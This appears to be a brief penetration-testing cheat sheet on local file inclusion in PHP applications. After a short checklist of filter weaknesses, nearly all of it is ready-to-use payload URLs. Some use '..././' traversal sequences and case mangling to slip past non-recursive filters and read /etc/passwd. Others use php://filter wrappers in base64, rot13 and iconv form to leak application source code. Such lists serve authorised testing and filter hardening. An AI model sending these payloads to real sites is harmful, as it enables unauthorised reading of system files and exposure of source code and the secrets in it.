___
Things to consider:

- Are filters applied recursively ?
- Insufficient character blacklist
- Not using allow lists
- Can it properly handle encoded payloads?

### **Basic**
**Non-recursive filter bypass**
```Python
http://example.com/read.php?file=..././..././..././..././..././..././etc/passwd
```
**Mangle capitals & operators for filter bypasses**
```Python
http://example.com/read.php?file=..././..././..././..././..././..././eTc/p+AsS+wd
```
### **PHP Wrappers**

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md

- Leak php code instead of executing it.
```Python
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```